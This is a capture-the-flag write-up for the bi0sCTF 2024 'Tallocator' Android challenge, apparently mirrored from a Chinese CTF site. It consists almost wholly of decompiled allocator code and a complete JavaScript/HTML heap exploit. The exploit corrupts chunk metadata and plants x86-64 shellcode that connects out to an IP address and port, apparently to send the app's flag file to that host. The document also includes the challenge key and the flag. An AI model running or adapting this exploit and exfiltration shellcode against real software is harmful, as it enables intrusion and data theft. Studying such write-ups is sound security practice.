# bi0sCTF 2024 Tallocator （未翻译）

> 原文: https://www.ctfiot.com/182577.html
> ID: 182577


```
chinmay@potato:~/Documents/CTF/bi0sCTF24/tallocator$ ls

app.apk Dockerfile flag native.c readme.md script.py
```



```
app/lib/

├── arm64-v8a

│   ├── libnative.so

│   └── libtallocator.so

├── armeabi-v7a

│   ├── libnative.so

│   └── libtallocator.so

├── x86

│   ├── libnative.so

│   └── libtallocator.so

└── x86_64

 ├── libnative.so

 └── libtallocator.so
```



```
const key = "50133tbd5mrt1769";
```



```
//Java_bi0sctf_android_challenge_MainActivity_talloc

 v6 = a1;

 if ( is_talloc_inited == 1 )

 {

 v7 = (_QWORD *)sbrk_ed;

 }

 else

 {

 a2 = 4096LL;

 qword_4150 = (__int64)mmap((void *)0x41410000, 0x1000uLL, 7, 34, -1, 0LL);

 is_talloc_inited = 1;

 a1 = 4096LL;

 v7 = sbrk(4096LL);

 sbrk_ed = (__int64)v7;

 v7[1] = 0x30LL;

 v7[7] = 0xFC8LL;

 v7[4] = 0x3A63LL;

 wilderness_s = (__int64)(v7 + 7);

 }

 v8 = (void (__fastcall *)(__int64, __int64))v7[5];

 if ( v8 ) // ticket to hollywood

 {

 v8(a1, a2);

 perror("Debugger called !!");

 }
```



```
//Java_bi0sctf_android_challenge_MainActivity_talloc

 size = (data_size + 0x17) & 0xFFFFFFFFFFFFFFF0LL;

 if ( (unsigned int)size > 0x150 )

 {

 if ( (unsigned int)(size - 0x151) <= 0xEAE )

 {

 v21 = sbrk_ed;

 curr = *(_QWORD **)(sbrk_ed + 0x18);

 if ( curr )

 {

 diff = 0x7FFFFFFF;

 v24 = 19;

 found = 0LL;

 do

 {

 curr_size = *(curr - 1);

 if ( curr_size >= data_size )

 {

 v26 = size - curr_size;

 v27 = curr_size - size;

 if ( v27 < 0 )

 v27 = v26;

 if ( v27 < diff )

 {

 diff = v27;

 found = curr;

 }

 }

 curr = (_QWORD *)*curr;

 v28 = v24-- != 0;

 }

 while ( curr && v28 );

 if ( found )

 {

 if ( *found )

 *(_QWORD *)(*found + 8LL) = found[1];

 v29 = (_QWORD *)found[1];

 if ( v29 )

 *v29 = *found;

 }

 if ( *(_QWORD **)(v21 + 24) == found )

 {

 *(_QWORD *)(v21 + 24) = *found;

 goto LABEL_44;

 }

LABEL_40:

 if ( found )

 goto LABEL_44;

 }

 }

 }
```



```
//Java_bi0sctf_android_challenge_MainActivity_talloc

 v30 = (_QWORD *)wilderness_s;

 if ( *(_QWORD *)wilderness_s < size )

 {

 perror("Cant give you more memory !!");

 v30 = (_QWORD *)wilderness_s;

 }

 found = v30 + 1;

 wilderness_s = (__int64)v30 + size;

 *(_QWORD *)((char *)v30 + size) = *v30 - size;

 *v30 = size;

LABEL_44:

 input = (const void *)(*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)v6 + 1472LL))(v6, a4, 0LL);

 if ( input_size <= data_size )

 memcpy(found, input, input_size);

 v32 = *(found - 1);

 if ( (v32 & 1) != 0 )

 {

 printf("%s", "Overwriting Chunks !!");

 exit(0);

 }

 *(found - 1) = v32 | 1;

 return found;
```



```
//Java_bi0sctf_android_challenge_MainActivity_tree

 v3 = *(a3 - 1);

 if ( (v3 & 1) == 0 )

 {

 printf("%s", "Double Tree !!");

 exit(0);

 }

 size = v3 & 0xFFFFFFFFFFFFFFFELL;

 *(a3 - 1) = size;

 v5 = (_QWORD *)wilderness_s;

 if ( (_QWORD *)wilderness_s != (_QWORD *)((char *)a3 + ((__int64)((size << 32) - 0x800000000LL) >> 32)) )

 {

 if ( (int)size > 0x100 )

 {

 v6 = *(_QWORD *)(sbrk_ed + 0x18);
```



```
//Java_bi0sctf_android_challenge_MainActivity_tree

 if ( (int)size > 0x100 )

 {

 v6 = *(_QWORD *)(sbrk_ed + 24);

 v7 = sbrk_ed + 24;

 if ( v6 )

 goto LABEL_5;

 }

 else

 {

 v6 = *(_QWORD *)(sbrk_ed + 16);

 v7 = sbrk_ed + 16;

 if ( v6 )

 {

LABEL_5:

 *a3 = v6;

 a3[1] = v7;

 *(_QWORD *)(*(_QWORD *)v7 + 8LL) = a3;

LABEL_9:

 *(_QWORD *)v7 = a3;

 return 0LL;

 }

 }

 *a3 = 0LL;

 a3[1] = v7;

 goto LABEL_9;
```



```
//Java_bi0sctf_android_challenge_MainActivity_tree

 wilderness_s -= (int)size;

 *(_QWORD *)wilderness_s = *v5 - (int)size;

 *v5 = 0LL;

 return 0LL;
```



```
var arr = new Uint8Array(0x28);

for (var i = 0; i < 0x28; i++) {

 arr[i] = 0;

}

arr[0x18] = 1;

arr[0x19] = 1;

arr[0x20] = 9;

arr[0x22] = 0x41;

arr[0x23] = 0x41;

var ret = bi0sctf.secure_talloc(key, 0x28, arr);

bi0sctf.secure_talloc(key, 0x10, arr);
```



```
bi0sctf.secure_tree(key, ret + 0x20);

bi0sctf.secure_tree(key, ret);
```



```
arr[0x18] = 0;

bi0sctf.secure_talloc(key, 0x28, arr);
```



```
bi0sctf.secure_talloc(key, -23, arr);
```



```
arr[0x20] = 8;

bi0sctf.secure_tree(key, ret);

bi0sctf.secure_talloc(key, 0x28, arr);
```



```
bi0sctf.secure_talloc(key, 0xf0, smarr);

bi0sctf.secure_talloc(key, 0xf0, sharr);
```



```
bi0sctf.secure_tree(key, ret - 0x18);
```



```
bi0sctf.secure_talloc(key, 0x160, smarr);
```



```
bi0sctf.secure_talloc(key, 0x10, smarr);
```



```
bi0sctf{y0u_h4v3_t4ll0c3d_y0ur_w4y_thr0ugh_1281624072}
```



```
<html>

<Body>

<script>

const key = "50133tbd5mrt1769";

const shellcode = [0x48, 0x31, 0xC0, 0x48, 0x83, 0xC0, 0x29, 0x48, 0x31, 0xFF, 0x48, 0x89, 0xFA, 0x48, 0x83, 0xC7, 0x02, 0x48, 0x31, 0xF6, 0x48, 0x83, 0xC6, 0x01, 0x0F, 0x05, 0x48, 0x89, 0xC7, 0x48, 0x31, 0xC0, 0x50, 0x48, 0x83, 0xC0, 0x02, 0xC7, 0x44, 0x24, 0xFC, 0xC0, 0xA8, 0x01, 0x02, 0x66, 0xC7, 0x44, 0x24, 0xFA, 0x11, 0x5C, 0x66, 0x89, 0x44, 0x24, 0xF8, 0x48, 0x83, 0xEC, 0x08, 0x48, 0x83, 0xC0, 0x28, 0x48, 0x89, 0xE6, 0x48, 0x31, 0xD2, 0x48, 0x83, 0xC2, 0x10, 0x0F, 0x05, 0x57, 0x48, 0x31, 0xD2, 0x48, 0x89, 0xD6, 0x48, 0x8D, 0x3D, 0x19, 0x00, 0x00, 0x00, 0x6A, 0x02, 0x58, 0x0F, 0x05, 0x5F, 0x48, 0x89, 0xC6, 0x48, 0x31, 0xD2, 0x68, 0xE8, 0x03, 0x00, 0x00, 0x41, 0x5A, 0x6A, 0x28, 0x58, 0x0F, 0x05, 0xCC, 0x2F, 0x64, 0x61, 0x74, 0x61, 0x2F, 0x64, 0x61, 0x74, 0x61, 0x2F, 0x62, 0x69, 0x30, 0x73, 0x63, 0x74, 0x66, 0x2E, 0x61, 0x6E, 0x64, 0x72, 0x6F, 0x69, 0x64, 0x2E, 0x63, 0x68, 0x61, 0x6C, 0x6C, 0x65, 0x6E, 0x67, 0x65, 0x2F, 0x66, 0x6C, 0x61, 0x67, 0x00];

var arr = new Uint8Array(0x28);

for (var i = 0; i < 0x28; i++) {

 arr[i] = 0;

}

arr[0x18] = 1;

arr[0x19] = 1;

arr[0x20] = 9;

arr[0x22] = 0x41;

arr[0x23] = 0x41;

var ret = bi0sctf.secure_talloc(key, 0x28, arr);

bi0sctf.secure_talloc(key, 0x10, arr);

bi0sctf.secure_tree(key, ret + 0x20);

bi0sctf.secure_tree(key, ret);

arr[0x18] = 0;

bi0sctf.secure_talloc(key, 0x28, arr);

bi0sctf.secure_talloc(key, -23, arr);

var sharr = new Uint8Array(shellcode.length);

for (var i = 0; i < shellcode.length; i++) {

 sharr[i] = shellcode[i];

}

// substitute IP

sharr[0x29] = 192;

sharr[0x2a] = 168;

sharr[0x2b] = 1;

sharr[0x2c] = 1;

// substitute port

sharr[0x32] = 0x00;

sharr[0x33] = 80;

arr[0x20] = 8;

bi0sctf.secure_tree(key, ret);

bi0sctf.secure_talloc(key, 0x28, arr);

var smarr = new Uint8Array(8);

for (var i = 0; i < 8; i++) {

 smarr[i] = 0;

}

smarr[0] = 8;

smarr[2] = 0x41;

smarr[3] = 0x41;

bi0sctf.secure_talloc(key, 0xf0, smarr);

bi0sctf.secure_talloc(key, 0xf0, sharr);

bi0sctf.secure_tree(key, ret - 0x18);

bi0sctf.secure_talloc(key, 0x160, smarr);

bi0sctf.secure_talloc(key, 0x10, smarr);

</script>

</Body>

</html>
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/3-1716205227.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/4-1716205227.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/5-1716205228.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/7-1716205228.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/1-1716205228.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/0-1716205229.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/8-1716205229.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/8-1716205230.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/6-1716205230.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/7-1716205231.png)